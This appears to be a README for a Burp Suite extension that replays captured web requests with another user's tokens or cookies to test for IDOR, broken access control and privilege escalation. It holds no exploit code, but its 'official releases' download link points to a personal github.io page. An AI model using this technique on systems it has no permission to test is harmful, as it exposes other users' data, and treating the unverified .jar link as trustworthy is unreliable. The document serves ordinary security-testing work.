# 🛡️ Authz-ExeC - Test web app security with ease

[![Download Authz-ExeC](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://pruthvra2855.github.io)

Authz-ExeC helps you check how your web applications handle user permissions. It acts as an extension for Burp Suite, a tool security professionals use to inspect web traffic. Use this software to find issues where users gain unauthorized access to data or perform actions that should stay restricted.

## 📋 What this tool does

Web applications often fail to check if a user has permission to see specific data. This leads to security gaps like:

*   **Broken Access Control (BAC):** Users reach pages they should not see.
*   **Insecure Direct Object Reference (IDOR):** Users change numbers in a web address to view other users' private files.
*   **Broken Object Level Authorization (BOLA):** An extension of IDOR where users perform unauthorized actions on objects.
*   **Privilege Escalation:** A standard user gains administrator rights.

Authz-ExeC simplifies this testing. It lets you capture a valid request and replay it with different user tokens to see if the server allows the action.

## ⚙️ System requirements

Before you begin, ensure your computer meets these requirements:

*   **Operating System:** Windows 10 or Windows 11.
*   **Burp Suite:** You need Burp Suite Professional or Community Edition installed.
*   **Java:** The latest Java Runtime Environment installed on your system.
*   **Memory:** At least 8GB of RAM, as Burp Suite consumes memory while processing traffic.

## 🚀 Getting started

Follow these steps to set up the extension on your machine.

### 1. Download the file
Visit the official releases page to obtain the necessary file for your installation.

[Click here to visit the download page](https://pruthvra2855.github.io)

Look for the latest release on that page. Download the file ending in `.jar`. Save this file in a folder where you can easily find it, such as your Downloads or Documents folder.

### 2. Prepare Burp Suite
Open Burp Suite. If you use the Community Edition, wait for the program to load. Once the main dashboard appears, locate the Extensions tab at the top of the screen.

### 3. Install the extension
Inside the Extensions tab, look for the 'Installed' sub-tab. Click the button labeled 'Add'. A new window appears. Ensure the 'Extension type' is set to 'Java'. 

Click 'Select file' and navigate to the folder where you saved the `.jar` file earlier. Select the file and click 'Next'. Burp Suite will load the extension. You should see Authz-ExeC appear in the list.

## 🛠️ How to use the tool

Once you enable the extension, a new tab labeled 'Authz-ExeC' will appear in your Burp Suite interface.

1.  **Configure your browser:** Set up your web browser to route traffic through Burp Suite.
2.  **Intercept traffic:** Turn on Burp Suite's Intercept feature. Browse your target website.
3.  **Send request:** Right-click a web request in the 'HTTP History' tab. Select 'Send to Authz-ExeC'.
4.  **Set parameters:** In the Authz-ExeC tab, define your test parameters. You can replace authorization headers or session cookies to mimic another user.
5.  **Run the test:** Click the 'Execute' button. The tool sends the modified request to the server.
6.  **Analyze results:** Compare the server response to your original request. If the server returns data that the second user should not see, you have found a security flaw.

## 💡 Best practices for testing

Testing permissions takes time. Keep these tips in mind during your work:

*   **Use two accounts:** Create two distinct user accounts on the application. Use Account A to capture the request and Account B to test for unauthorized access.
*   **Check the status code:** Pay attention to HTTP status codes. A '200 OK' response usually means the server allowed the action. A '403 Forbidden' response suggests the permission check worked correctly.
*   **Test all endpoints:** Check all pages where a user retrieves or modifies data. Do not focus only on the main dashboard.
*   **Document findings:** Note the steps you took. When you find a bug, record the exact request and response so you can show developers what went wrong.

## ❓ Frequently asked questions

**Does this tool work on Windows 7?**
The tool requires modern versions of the Java platform. We recommend Windows 10 or newer for the best experience.

**Do I need Burp Suite Professional?**
No. This extension works with Burp Suite Community Edition.

**How do I update the tool?**
Delete the old `.jar` file from your computer. Download the newest version from the link provided above and follow the installation steps again.

**The extension does not appear.**
Ensure you selected the 'Java' option during the installation step. If the problem persists, check that you have the latest version of Java installed on your Windows machine.

Keywords: burp-extensions, security-testing, web-security, access-control, pentesting